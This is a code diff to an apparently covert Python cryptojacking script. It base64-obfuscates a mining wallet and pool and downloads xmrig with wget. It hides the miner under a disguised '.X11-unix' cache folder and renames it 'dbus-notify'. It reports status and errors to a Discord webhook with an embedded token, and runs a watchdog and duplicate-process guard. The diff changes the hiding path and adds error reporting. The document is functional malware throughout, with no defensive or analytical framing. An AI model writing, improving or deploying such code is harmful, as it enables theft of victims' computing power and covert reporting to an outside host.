@@ -1,21 +1,19 @@
 import os, subprocess, time, socket, threading, requests, base64
-from datetime import datetime
 
 # === Obfuscated Config ===
-WALLET = base64.b64decode("TVJDVUxFMm1rR0tIc0hSZ2l1SDVERlF3Q0NPZDZLZ2JIOHNuclN3M3pHUmU1dUpmNW1SRVVmS0c5a3A2dmlZQVp6b29EaWtKaVRIbmtObGxZaTNQYW9vOVp0cnpYSFJRMTlaMm8=").decode()  # Insert your base64 wallet
-POOL = base64.b64decode("c2UubXJjdWxlLnVyZWJ6dmFyZWYucGJ6OjExMjM=").decode()  # Insert your base64 pool
+WALLET = base64.b64decode("TVJDVUxFMm1rR0tIc0hSZ2l1SDVERlF3Q0NPZDZLZ2JIOHNuclN3M3pHUmU1dUpmNW1SRVVmS0c5a3A2dmlZQVp6b29EaWtKaVRIbmtObGxZaTNQYW9vOVp0cnpYSFJRMTlaMm8=").decode()
+POOL = base64.b64decode("c2UubXJjdWxlLnVyZWJ6dmFyZWYucGJ6OjExMjM=").decode()
 COIN = "zeph"
 THREADS = "4"
 RIG_ID = "sysd0"
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1395138384518844508/riuLCmuUuVfVZECJE-zW75VwARH2p9jd8yP_Z1ndjP4gvNMH08Mf7C9PpXcITM-nmw8B"  # insert full URL
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1395138384518844508/riuLCmuUuVfVZECJE-zW75VwARH2p9jd8yP_Z1ndjP4gvNMH08Mf7C9PpXcITM-nmw8B"
 
 # === Paths ===
-BIN_DIR = os.path.expanduser("~/.dbus")
+BIN_DIR = os.path.expanduser("~/.cache/.X11-unix")
 MINER_BIN = os.path.join(BIN_DIR, "dbus-notify")
 LOGFILE = os.path.join(BIN_DIR, "syslog.txt")
 SCRIPT_PATH = os.path.abspath(__file__)
 
-# === Status ===
 status = {"running": False, "start_time": None}
 
 def run_cmd(cmd):
@@ -31,17 +29,22 @@ def send_discord(msg):
         pass
 
 def install_miner():
-    if not os.path.exists(MINER_BIN):
+    try:
+        if os.path.isdir(MINER_BIN):
+            subprocess.run(f"rm -rf {MINER_BIN}", shell=True)
         os.makedirs(BIN_DIR, exist_ok=True)
         archive = os.path.join(BIN_DIR, "xmr.tar.gz")
         url = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
         run_cmd(f"wget -qO {archive} {url}")
         run_cmd(f"tar -xf {archive} -C {BIN_DIR}")
         for f in os.listdir(BIN_DIR):
-            if "xmrig" in f and os.access(os.path.join(BIN_DIR, f), os.X_OK):
-                os.rename(os.path.join(BIN_DIR, f), MINER_BIN)
+            full = os.path.join(BIN_DIR, f)
+            if "xmrig" in f and os.access(full, os.X_OK):
+                os.rename(full, MINER_BIN)
                 break
         os.chmod(MINER_BIN, 0o700)
+    except Exception as e:
+        send_discord(f"❌ Miner install error: {e}")
 
 def start_miner():
     if not status["running"]:
@@ -99,15 +102,17 @@ def watchdog():
                 start_miner()
 
 def self_guard():
-    # Prevent multiple copies
-    import psutil
-    me = os.path.abspath(__file__)
-    for p in psutil.process_iter(['pid', 'cmdline']):
-        try:
-            if p.pid != os.getpid() and me in ' '.join(p.cmdline()):
-                exit()
-        except:
-            pass
+    try:
+        import psutil
+        me = os.path.abspath(__file__)
+        for p in psutil.process_iter(['pid', 'cmdline']):
+            try:
+                if p.pid != os.getpid() and me in ' '.join(p.cmdline()):
+                    exit()
+            except:
+                pass
+    except:
+        send_discord("❌ Crash:\nNo module named 'psutil'")
 
 def report_log():
     try:
